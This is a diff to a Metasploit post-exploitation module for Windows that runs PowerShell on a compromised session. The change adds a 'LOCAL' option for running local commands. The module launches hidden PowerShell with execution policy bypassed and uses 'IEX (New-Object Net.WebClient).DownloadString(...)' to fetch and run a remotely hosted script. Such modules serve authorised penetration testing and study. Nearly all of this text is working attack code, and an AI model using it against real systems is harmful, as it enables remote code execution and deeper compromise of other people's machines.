@@ -1,8 +1,9 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
-# Current source: https://github.com/rapid7/metasploit-framework
+# 	This module requires Metasploit: http//metasploit.com/download
+# 	Current source: https://github.com/rapid7/metasploit-framework
+#
+#	For local commands use "& {command}" format
 ##
-
 require 'msf/core'
 
 
@@ -14,7 +15,7 @@ class Metasploit3 < Msf::Post
     super(update_info(info,
       'Name'			=> 'Remote Powershell Script Execution',
       'Description'	 	=> %q{
-        This module will run a remotely-hosted powershell script/command on the remote system.
+        This module will run a remotely-hosted powershell script or local command on the remote system.
       },
       'License'       	=> BSD_LICENSE,
       'Platform'      	=> [ 'win' ],
@@ -27,6 +28,7 @@ class Metasploit3 < Msf::Post
 	register_options(
       [
 		OptString.new( 'SCRIPT', [false, "The Powershell Script URL"]),
+		OptString.new( 'LOCAL',	[false, "String for local commands"]),
         OptString.new( 'COMMAND', [false, "The script command to run"])
       ], self.class)
 	  
@@ -34,9 +36,12 @@ class Metasploit3 < Msf::Post
   end
  
  def run
-				
+		if !(datastore['LOCAL'].nil? or datastore['LOCAL'].empty?)
+		process = session.sys.process.execute("powershell -nop -exec bypass -c #{datastore['LOCAL']}", nil, {'Hidden' => 'true', 'Channelized' => true})
+		else
 		process = session.sys.process.execute("powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('#{datastore['SCRIPT']}'); #{datastore['COMMAND']}\"", nil, {'Hidden' => 'true', 'Channelized' => true})
-		
+		end
+				
 		while(d = process.channel.read)
 		print_line(d)
 		end
